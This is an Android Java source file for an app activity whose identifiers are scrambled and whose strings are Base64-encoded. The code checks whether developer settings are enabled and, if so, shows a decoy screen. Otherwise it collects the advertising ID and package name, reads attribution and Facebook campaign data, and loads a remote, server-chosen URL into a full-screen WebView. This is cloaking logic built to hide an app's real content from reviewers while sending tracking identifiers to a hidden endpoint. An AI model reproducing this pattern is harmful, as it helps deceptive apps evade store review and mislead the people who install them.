package com.atnncei.vnuaak;

import static com.atnncei.vnuaak.PPapps.aaaParamatnnceivnuaak;
import static com.atnncei.vnuaak.PPapps.ffdIDatnnceivnuaak;
import static com.atnncei.vnuaak.PPapps.KEY_APP_ATNNCEI_VNUAAK;
import static com.atnncei.vnuaak.PPapps.statnnceivnuaak;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;

import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.provider.Settings;

import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebView;

import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;

public class AV1 extends AppCompatActivity {

    private static String AtNNCEI_VNUAAK_SIGNAL = "YTViMGFjZTktOGM2Yi00OGIyLTg3ZjctMzI2ZDhkOThkN2U0";
    public static ValueCallback<Uri[]> FILE_ATNNCEI_VNUAAK;
    public static String PHOTO_ATNNCEI_VNUAAK;
    public static String fbDataatnnceivnuaak;
    public static String OF_ATNNCEI_VNUAAK;
    public static String CO_ATNNCEI_VNUAAK;
    public static String BF_ATNNCEI_VNUAAK;
    public static String BB_ATNNCEI_VNUAAK;
    private String oooSharatnnceivnuaak;
    public String kksytopatnnceivnuaak;
    WebView webatnnceivnuaakView;

    @Override
    protected void onActivityResult(int requestCodeatnnceivnuaak, int resultCodeatnnceivnuaak, @Nullable Intent dataatnnceivnuaak) {
        super.onActivityResult(requestCodeatnnceivnuaak, resultCodeatnnceivnuaak, dataatnnceivnuaak);

        if (requestCodeatnnceivnuaak != 1 || FILE_ATNNCEI_VNUAAK == null) {
            super.onActivityResult(requestCodeatnnceivnuaak, resultCodeatnnceivnuaak, dataatnnceivnuaak);
            return;
        }
        Uri[] resultsSsetcerOefljgun = null;
        if (resultCodeatnnceivnuaak == Activity.RESULT_OK) {
            if (dataatnnceivnuaak == null || dataatnnceivnuaak.getData() == null) {
                if (kksytopatnnceivnuaak != null) {
                    resultsSsetcerOefljgun = new Uri[]{Uri.parse(kksytopatnnceivnuaak)};
                }
            } else {
                String dataString = dataatnnceivnuaak.getDataString();
                if (dataString != null) {
                    resultsSsetcerOefljgun = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        FILE_ATNNCEI_VNUAAK.onReceiveValue(resultsSsetcerOefljgun);
        FILE_ATNNCEI_VNUAAK = null;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getWindow().addFlags(1024);
        MyWebView.av = this;
        webatnnceivnuaakView = findViewById(R.id.web_view);
        oneSiggglop(this);
        int kop = Settings.Secure.getInt(this.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        if (kop == 1) {
            Intent intent = new Intent(this, Center.class);
            startActivity(intent);
            finishAffinity();
        } else if (kop == 0) {
            try {
                new PPapps(this);

                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            BB_ATNNCEI_VNUAAK = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                        } catch (Exception e) {
                        }
                    }
                }).start();
                new RetRo();


                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Asdf(RetRo.retroLineatnnceivnuaak);
                        FacebookSdk.setApplicationId(BF_ATNNCEI_VNUAAK);
                        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                        FacebookSdk.fullyInitialize();
                        FacebookSdk.setAutoInitEnabled(true);
                        FacebookSdk.setAutoLogAppEventsEnabled(true);
                        AppLinkData.fetchDeferredAppLinkData(AV1.this, new AppLinkData.CompletionHandler() {
                            @Override
                            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData apatnnceivnuaak) {
                                if (apatnnceivnuaak == null) {
                                    apatnnceivnuaak = AppLinkData.createFromActivity(AV1.this);
                                }
                                if (apatnnceivnuaak != null) {
                                    Uri llll = apatnnceivnuaak.getTargetUri();
                                    String tyu = llll.getQuery();
                                    fbDataatnnceivnuaak = Pardd.Parser(tyu);

                                }
                            }
                        });
                    }
                }, 3000);

                SharedPreferences dd = PreferenceManager.getDefaultSharedPreferences(this);
                oooSharatnnceivnuaak = dd.getString(Dec.DecPoo("cHBwX2tlZXk="), null);
            }catch (Exception e){
                Intent intent = new Intent(this, PointGG.class);
                startActivity(intent);
                finishAffinity();
            }
            if (oooSharatnnceivnuaak != null) {
                webatnnceivnuaakView.setVisibility(View.VISIBLE);
                webatnnceivnuaakView.loadUrl(oooSharatnnceivnuaak);
            } else {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        webatnnceivnuaakView.setVisibility(View.VISIBLE);
                        if (statnnceivnuaak.equals(Dec.DecPoo("Tm9uLW9yZ2FuaWM="))) {
                            String rer = (OF_ATNNCEI_VNUAAK + aaaParamatnnceivnuaak);
                            webatnnceivnuaakView.loadUrl(rer);
                        } else if (fbDataatnnceivnuaak != null) {
                            String rer = (OF_ATNNCEI_VNUAAK + fbDataatnnceivnuaak);
                            webatnnceivnuaakView.loadUrl(rer);
                        } else {
                            if(CO_ATNNCEI_VNUAAK.equals(Dec.DecPoo("Tk8="))){
                                Intent intent = new Intent(AV1.this, Center.class);
                                startActivity(intent);
                                finishAffinity();
                            }else{
                                String papap =(CO_ATNNCEI_VNUAAK + Dec.DecPoo("P2J1bmRsZT0=") + getPackageName() +
                                        Dec.DecPoo("JmFkX2lkPQ==") + BB_ATNNCEI_VNUAAK + Dec.DecPoo("JmFwcHNfaWQ9") +
                                        ffdIDatnnceivnuaak + Dec.DecPoo("JmRldl9rZXk9") + Dec.DecPoo(KEY_APP_ATNNCEI_VNUAAK));
                                String rer = (OF_ATNNCEI_VNUAAK + papap);
                                webatnnceivnuaakView.loadUrl(rer);
                            }


                        }
                    }
                }, 5000);
            }
        }

    }

    @Override
    public void onBackPressed() {
        if (webatnnceivnuaakView.isFocusable() && webatnnceivnuaakView.canGoBack()) {
            webatnnceivnuaakView.goBack();
        }
    }

    public void oneSiggglop(Context context) {
        com.onesignal.OneSignal.setLogLevel(com.onesignal.OneSignal.LOG_LEVEL.VERBOSE, com.onesignal.OneSignal.LOG_LEVEL.NONE);
        com.onesignal.OneSignal.initWithContext(context);
        com.onesignal.OneSignal.setAppId(Dec.DecPoo(AtNNCEI_VNUAAK_SIGNAL));
    }

    public void Asdf(String lINE) {
        String[] arrayLine = lINE.split("\\u007c");
        OF_ATNNCEI_VNUAAK = arrayLine[0];
        CO_ATNNCEI_VNUAAK = arrayLine[1];
        BF_ATNNCEI_VNUAAK = arrayLine[2];
    }


}